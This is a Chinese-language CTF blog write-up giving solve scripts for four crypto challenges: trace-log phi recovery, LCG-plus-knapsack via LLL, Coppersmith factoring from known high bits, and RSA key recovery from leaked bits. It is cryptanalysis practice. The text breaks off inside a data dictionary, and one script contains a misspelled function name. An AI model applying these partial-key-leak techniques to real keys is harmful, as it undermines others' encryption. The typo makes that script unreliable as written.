    <published>2022-10-30T08:01:35.000Z</published>
    <updated>2022-10-30T08:05:47.704Z</updated>
    
    <content type="html"><![CDATA[<p>第二次参加了，时间好快呀</p><span id="more"></span><h3 id="tracing">tracing</h3><p>大概的逻辑就是从日志逆推出phi</p><p>从最后这里return a可以看出s一直是0</p><p><img src="../images/%E7%A5%A5%E4%BA%91%E6%9D%AF/asynccode" alt="img"></p><p>，所以只有三种情况，分别判定然后逆就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">if_exc</span>(<span class="params">ct</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a, b = b, a&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isOdd</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> a &amp; <span class="number">1</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;trace.out&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">l = <span class="built_in">len</span>(a)</span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line">e = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;task.py(6):     while b != 0:&#x27;</span> == a[i]:</span><br><span class="line">        idx = i</span><br><span class="line">        ct = a[idx: idx+<span class="number">13</span>]</span><br><span class="line">        <span class="keyword">if</span> if_exc(ct):</span><br><span class="line">            phi, e = e, phi</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;task.py(9):                 a = a - b&#x27;</span> <span class="keyword">in</span> ct <span class="keyword">and</span> <span class="string">&quot;task.py(10):                 a = rshift1(a)&quot;</span> <span class="keyword">in</span> ct:</span><br><span class="line">            phi = <span class="number">2</span> * phi + e</span><br><span class="line">            <span class="keyword">if</span> isOdd(phi):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                phi = phi + <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;task.py(14):                 b = rshift1(b)&quot;</span> <span class="keyword">in</span> ct:</span><br><span class="line">            e *= <span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;task.py(19):                 a = rshift1(a)&quot;</span> <span class="keyword">in</span> ct:</span><br><span class="line">            phi *= <span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">64885875317556090558238994066256805052213864161514435285748891561779867972960805879348109302233463726130814478875296026610171472811894585459078460333131491392347346367422276701128380739598873156279173639691126814411752657279838804780550186863637510445720206103962994087507407296814662270605713097055799853102</span></span><br><span class="line">n = <span class="number">113793513490894881175568252406666081108916791207947545198428641792768110581083359318482355485724476407204679171578376741972958506284872470096498674038813765700336353715590069074081309886710425934960057225969468061891326946398492194812594219890553185043390915509200930203655022420444027841986189782168065174301</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"><span class="built_in">print</span>(phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><h3 id="fill">fill</h3><p>背包+lcg套娃</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">S = <span class="number">492226042629702</span></span><br><span class="line">nbits = <span class="number">32</span></span><br><span class="line">n = <span class="number">991125622</span></span><br><span class="line">s0, s1, s2 = <span class="number">562734112</span>, <span class="number">859151551</span>, <span class="number">741682801</span></span><br><span class="line">m = (s2 - s1) * inverse(s1 - s0, n) % n </span><br><span class="line">c = (s2 - m * s1) % n</span><br><span class="line">s = [<span class="number">0</span>] * nbits</span><br><span class="line">s[<span class="number">0</span>] = s0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, nbits):</span><br><span class="line">    s[i] = (s[i-<span class="number">1</span>]*m+c)%n</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">M = [<span class="number">19621141192340</span>, <span class="number">39617541681643</span>, <span class="number">3004946591889</span>, <span class="number">6231471734951</span>, <span class="number">3703341368174</span>, <span class="number">48859912097514</span>, <span class="number">4386411556216</span>, <span class="number">11028070476391</span>, <span class="number">18637548953150</span>, <span class="number">29985057892414</span>, <span class="number">20689980879644</span>, <span class="number">20060557946852</span>, <span class="number">46908191806199</span>, <span class="number">8849137870273</span>, <span class="number">28637782510640</span>, <span class="number">35930273563752</span>, <span class="number">20695924342882</span>, <span class="number">36660291028583</span>, <span class="number">10923264012354</span>, <span class="number">29810154308143</span>, <span class="number">4444597606142</span>, <span class="number">31802472725414</span>, <span class="number">23368528779283</span>, <span class="number">15179021971456</span>, <span class="number">34642073901253</span>, <span class="number">44824809996134</span>, <span class="number">31243873675161</span>, <span class="number">27159321498211</span>, <span class="number">2220647072602</span>, <span class="number">20255746235462</span>, <span class="number">24667528459211</span>, <span class="number">46916059974372</span>]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    M[t] = M[t] - s[t]</span><br><span class="line">A = Matrix(ZZ,nbits+<span class="number">1</span>,nbits+<span class="number">1</span>)</span><br><span class="line"><span class="comment"># fill in the identity matrix</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    A[i,i] = <span class="number">1</span></span><br><span class="line"><span class="comment"># replace the bottom row with your public key</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    A[i,nbits] = M[i]</span><br><span class="line"><span class="comment"># last element is the encoded message</span></span><br><span class="line">A[nbits,nbits] = -<span class="built_in">int</span>(S)</span><br><span class="line">res = A.LLL()</span><br><span class="line"><span class="built_in">print</span>(res[-<span class="number">1</span>][:-<span class="number">1</span>]) <span class="comment">#need to remove last element 0</span></span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    msg += <span class="built_in">str</span>(res[-<span class="number">1</span>][:-<span class="number">1</span>][i])</span><br><span class="line">msg = <span class="built_in">int</span>(msg, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + sha256(<span class="built_in">str</span>(msg).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="little-little-fermat">little little fermat</h3><p>高位相同，开根取高位，然后copper就分解，求阶那里直接用order</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, isPrime</span><br><span class="line">n = <span class="number">141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393</span></span><br><span class="line">c = <span class="number">81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883</span></span><br><span class="line"></span><br><span class="line">p_high = <span class="number">1722441419253596810002937511265334240319736590159222908199095871448693784787182036443</span></span><br><span class="line">PR.&lt;z&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = z + p_high*<span class="number">2</span>^(<span class="number">512</span>-<span class="number">280</span>)</span><br><span class="line">z0 = f.small_roots(X=<span class="number">2</span>^(<span class="number">512</span>-<span class="number">280</span>), beta=<span class="number">0.4</span>)</span><br><span class="line">p_q = []</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> z0:</span><br><span class="line">    p = <span class="built_in">int</span>(z + p_high*<span class="number">2</span>^(<span class="number">512</span>-<span class="number">280</span>))</span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        p_q.append(p)</span><br><span class="line">p = <span class="built_in">max</span>(p_q)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(<span class="number">65537</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">G=GF(p)</span><br><span class="line">x = G(<span class="number">114514</span>).order() - <span class="number">1</span></span><br><span class="line">x = x^<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(long_to_byets(m^^x))</span><br></pre></td></tr></table></figure><h3 id="leak_rsa">leak_rsa</h3><p>总的逻辑是先用d的高位去爆破32位的k，再用k去爆破pqd，第一步的代码直接抄github上的https://github.com/jvdsn/crypto-attacks/blob/5c7989ceac599f1f8e016b5afb0d2966759cd470/test/test_factorization.py#L46，但是因为是32bit要用多进程才跑的出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_params_prob</span>():</span><br><span class="line">    n = <span class="number">73380160475470842653695210816683702314062827937540324056880543809752271506601290265975543542548117392788987830919581511428492717214125296973338501980504384307279414528799452106399062576988406269897425829853390463840834798274139351938197666753546672052277640048588091137812362810008344723302886421059831149393</span></span><br><span class="line">    e = <span class="number">3116872133</span></span><br><span class="line">    c = <span class="number">69574121902821459446683688068339366486115223765903849266663001038736496551168104587683366853482649748413400537793260948337629422998336301256862519087984048032673577462034223842650399943613576577927825123830629917138007035313624847266208032195071033675853881447717750353382112841885318776240405314057286867952</span></span><br><span class="line">    hint1 = &#123;<span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">401</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">420</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">192</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">497</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">110</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">206</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">326</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">320</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">222</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">166</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">496</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">181</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">288</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">69</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">127</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">308</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">235</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">94</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">309</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">487</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">234</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">98</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">101</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">387</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">162</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">485</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">413</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">242</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">456</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">264</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">407</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">135</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">84</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">476</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">176</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">230</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">432</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">79</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">290</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">507</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">421</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">334</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">85</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">511</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">464</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">491</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">370</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">92</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">495</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">279</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">346</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">87</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">243</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">147</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">411</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">378</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">269</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">291</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">468</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">124</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">    hint2 = &#123;<span class="number">125</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">385</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">315</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">348</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">154</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">136</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">440</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">250</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">270</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">318</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">107</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">474</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">325</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">278</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">109</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">423</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">190</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">171</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">475</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">441</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">323</span>: <span 